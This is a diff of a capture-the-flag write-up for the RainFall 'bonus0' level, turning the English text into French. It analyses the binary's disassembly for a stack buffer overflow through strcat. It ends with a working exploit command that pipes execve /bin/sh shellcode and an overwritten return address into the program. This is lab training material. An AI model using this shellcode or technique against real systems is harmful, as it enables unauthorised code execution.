@@ -1,6 +1,6 @@
-# Bonus 0
+# 10 - Stack buffer overflow 2
 
-- We login as user bonus0:
+- On se connecte en tant que bonus0:
 ```
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
@@ -107,13 +107,14 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
-- Let's highlight the most important parts of the program:
+- Voyons les parties les plus importantes du programme:
 ```
+   0x080485aa <+6>:     sub    $0x40,%esp
    0x080485ad <+9>:     lea    0x16(%esp),%eax
    0x080485b1 <+13>:    mov    %eax,(%esp)
    0x080485b4 <+16>:    call   0x804851e <pp>
 ```
->The `<pp>` function is called with an address located at `0x16(%esp)`.
+> La fonction `<pp>` est appelée avec une adresse située en `0x16(%esp)`.
 
 ```
    0x08048526 <+8>:     mov    DWORD PTR [esp+0x4],0x80486a0
@@ -125,7 +126,7 @@ End of assembler dump.
    0x08048544 <+38>:    mov    DWORD PTR [esp],eax
    0x08048547 <+41>:    call   0x80484b4 <p>
 ```
->The `<p>` function is called twice, each time with a stack address.
+> La fonction `<p>` est appelée deux fois, chaque fois avec une adresse de la stack.
 
 ```
    0x080484c8 <+20>:    mov    DWORD PTR [esp+0x8],0x1000
@@ -136,14 +137,6 @@ End of assembler dump.
 ```
 
 ```
-   0x080484e6 <+50>:    mov    DWORD PTR [esp+0x4],0xa
-   0x080484ee <+58>:    lea    eax,[ebp-0x1008]
-   0x080484f4 <+64>:    mov    DWORD PTR [esp],eax
-   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
-   0x080484fc <+72>:    mov    BYTE PTR [eax],0x0
-```
-
-```
    0x080484ff <+75>:    lea    eax,[ebp-0x1008]
    0x08048505 <+81>:    mov    DWORD PTR [esp+0x8],0x14
    0x0804850d <+89>:    mov    DWORD PTR [esp+0x4],eax
@@ -151,7 +144,7 @@ End of assembler dump.
    0x08048514 <+96>:    mov    DWORD PTR [esp],eax
    0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
 ```
->The `<p>` function `<read@plt>` from stdin with a size of 4096, then attempts to replace the first '\n' in the read buffer with a '\0', and finally copies the first 20 bytes of this buffer to the address provided as a parameter to the function.
+> La fonction `<p>` lit 4096 depuis stdin, et copie les 20 premiers octets de ce buffer à l'adresse fournie en argument.
 
 ```
    0x0804854c <+46>:    lea    eax,[ebp-0x30]
@@ -162,37 +155,15 @@ End of assembler dump.
 ```
 
 ```
-   0x08048563 <+69>:    mov    eax,DWORD PTR [ebp+0x8]
-   0x08048566 <+72>:    mov    DWORD PTR [ebp-0x3c],0xffffffff
-   0x0804856d <+79>:    mov    edx,eax
-   0x0804856f <+81>:    mov    eax,0x0
-   0x08048574 <+86>:    mov    ecx,DWORD PTR [ebp-0x3c]
-   0x08048577 <+89>:    mov    edi,edx
-   0x08048579 <+91>:    repnz scas al,BYTE PTR es:[edi]
-```
->The first buffer is copied to the address provided as a parameter to the `<pp>` function. Afterward, we will count the number of bytes that separate this address from the first '\0'.
-
-```
-   0x0804857b <+93>:    mov    eax,ecx
-   0x0804857d <+95>:    not    eax
-   0x0804857f <+97>:    sub    eax,0x1
-   0x08048582 <+100>:   add    eax,DWORD PTR [ebp+0x8]
-   0x08048585 <+103>:   movzx  edx,WORD PTR [ebx]
-   0x08048588 <+106>:   mov    WORD PTR [eax],dx
-```
-
-```
    0x0804858b <+109>:   lea    eax,[ebp-0x1c]
    0x0804858e <+112>:   mov    DWORD PTR [esp+0x4],eax
    0x08048592 <+116>:   mov    eax,DWORD PTR [ebp+0x8]
    0x08048595 <+119>:   mov    DWORD PTR [esp],eax
    0x08048598 <+122>:   call   0x8048390 <strcat@plt>
 ```
->Put a space before the previously found '\0', then concatenate the second buffer.
+>Nos buffers sont copiés à l'adresse fournie en argument de la fonction `<pp>`.
 
-- So, if the first buffer given to the `<p>` function doesn't contain a '\0', but the second one does, `<strcat@plt>` will concatenate the second buffer after the '\0' it contains, and its content could potentially overwrite the return address of the `<main>` function.
-
-- We will place the shellcode in the first buffer and at the beginning of the second buffer, then the address of the start of our buffer at the end of the second buffer.
+- Nous placerons donc les 20 premiers octets de notre shellcode dans le premier buffer et le reste dans le second buffer, suivi de l'adresse du début de notre shellcode.
 ```
 bonus0@RainFall:~$ (python -c "print('\x90\x90\x90\x90\x90\x90\x90\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73')"; python -c "print('\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + '\x36\xf7\xff\xbf' + 'a')"; cat) | ./bonus0
 
